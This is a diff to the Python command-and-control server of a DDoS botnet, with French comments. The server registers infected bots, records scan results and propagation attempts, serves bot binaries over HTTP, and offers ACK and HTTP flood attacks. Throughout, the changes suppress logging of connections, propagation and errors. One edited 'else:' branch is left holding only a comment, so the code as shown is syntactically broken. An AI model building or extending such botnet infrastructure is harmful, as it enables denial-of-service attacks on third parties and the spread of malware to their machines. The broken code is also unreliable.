@@ -37,7 +37,7 @@ def handle_bot(client_socket, address):
     
     # Vérifier si c'est un doublon
     if is_duplicate_bot(address[0]):
-        print(f"[-] Doublon détecté: {address[0]}")
+        # Ne pas afficher de message pour les doublons
         client_socket.close()
         return
     
@@ -59,16 +59,13 @@ def handle_bot(client_socket, address):
         'last_ping': time.time()
     }
     
-    # Log des connexions (réduit)
-    if len(connected_bots) % 10 == 0:
-        print(f"[+] {len(connected_bots)} bots connectés - Dernier: {address[0]}")
+    # Pas de log pour les connexions - on met juste à jour le compteur en interne
     
     try:
         # Réception du message d'identification
         data = client_socket.recv(1024).decode('utf-8', errors='ignore')
         
         if data:
-            print(f"[*] Message du bot {address[0]}: {data.strip()}")
             
             # Analyser les informations du bot
             if 'BOT_CONNECTED' in data:
@@ -95,7 +92,6 @@ def handle_bot(client_socket, address):
             # Ajouter le bot à la liste des connectés
             with lock:
                 connected_bots.append(bot_info)
-                print(f"[+] Bot ajouté à la liste. Total: {len(connected_bots)}")
             
             # Envoyer un ping initial pour vérifier la connexion
             client_socket.send("PING".encode('utf-8'))
@@ -107,27 +103,31 @@ def handle_bot(client_socket, address):
                 if not data:
                     break
                 
-                # Traiter les réponses du bot
+                # Traiter les réponses du bot sans afficher de messages
                 if data.startswith("SCAN_RESULT|"):
-                    print(f"[+] Résultats de scan de {address[0]}: {data.split('|')[1]}")
+                    # Ne pas afficher les résultats de scan
+                    pass
                 elif data.startswith("DDOS_STARTED|"):
                     active_ddos += 1
                     parts = data.split('|')
+                    # Afficher uniquement les attaques DDoS car c'est important
                     print(f"[+] Attaque DDoS démarrée contre {parts[1]} pour {parts[2]}")
                 elif data.startswith("PROPAGATION|"):
-                    parts = data.split('|')
-                    print(f"[+] Tentative de propagation vers {parts[1]}: {parts[2]}")
+                    # Ne pas afficher les logs de propagation
+                    pass
                 elif data == "PONG":
                     # Ping réussi, le bot est toujours actif
                     pass
                 else:
-                    print(f"[*] Message du bot {address[0]}: {data.strip()}")
+                    # Ne pas afficher les autres messages
             except Exception as e:
-                print(f"[!] Erreur de communication avec {address[0]}: {str(e)}")
+                # Ne pas afficher les erreurs de communication pour chaque bot
+                pass
                 break
     
     except Exception as e:
-        print(f"[!] Erreur avec le bot {address[0]}: {str(e)}")
+        # Ne pas afficher les erreurs pour chaque bot
+        pass
     
     finally:
         # Supprime le bot de la liste quand il se déconnecte
@@ -140,7 +140,7 @@ def handle_bot(client_socket, address):
                     connected_bots.pop(i)
                     break
         
-        print(f"[-] Bot {address[0]} déconnecté. Total restant: {len(connected_bots)}")
+        # Ne pas afficher de message pour les déconnexions
         client_socket.close()
 
 # Classe pour servir les fichiers binaires via HTTP
@@ -149,9 +149,8 @@ class BinaryHandler(http.server.SimpleHTTPRequestHandler):
         super().__init__(*args, directory=BINARIES_DIR, **kwargs)
     
     def log_message(self, format, *args):
-        # Journalisation personnalisée pour les téléchargements de binaires
-        if "GET /bot." in args[0]:
-            print(f"[+] Téléchargement de {args[0].split()[1]} par {self.client_address[0]}")
+        # Ne pas afficher les logs de téléchargement
+        pass
     
     def do_GET(self):
         # Servir les fichiers binaires
@@ -174,7 +173,7 @@ def send_command_to_bot(bot_index, command):
                 bot['tasks'].append(command)
                 total_commands += 1
             
-            print(f"[+] Commande envoyée à {bot['ip']} ({bot['hostname']})")
+            # Ne pas afficher de message pour chaque bot lors de l'envoi de commande
             return True
     except Exception as e:
         print(f"[!] Erreur lors de l'envoi de la commande: {str(e)}")
@@ -192,7 +191,9 @@ def broadcast_command(command):
             if send_command_to_bot(i, command):
                 success_count += 1
     
-    print(f"[+] Commande envoyée à {success_count}/{len(connected_bots)} bots")
+    # Afficher uniquement si demandé explicitement dans la commande broadcast
+    if "verbose" in command.lower():
+        print(f"[+] Commande envoyée à {success_count}/{len(connected_bots)} bots")
     return success_count
 
 # Interface utilisateur du serveur C2
@@ -215,7 +216,8 @@ def command_interface():
         print("- ack      : Flood de paquets ACK (très léger)")
         print("- http     : Flood HTTP avec rotation d'User-Agents")
         print("- mix      : Mélange d'attaques légères")
-        print(f"\nBots connectés: {len(connected_bots)} | Attaques actives: {active_ddos}")
+        # Afficher uniquement le nombre de bots et les attaques actives - information essentielle
+        print(f"\n[*] {len(connected_bots)} bots | {active_ddos} attaques DDoS actives")
         
         cmd = input("\n> ")
         cmd_parts = cmd.strip().split()
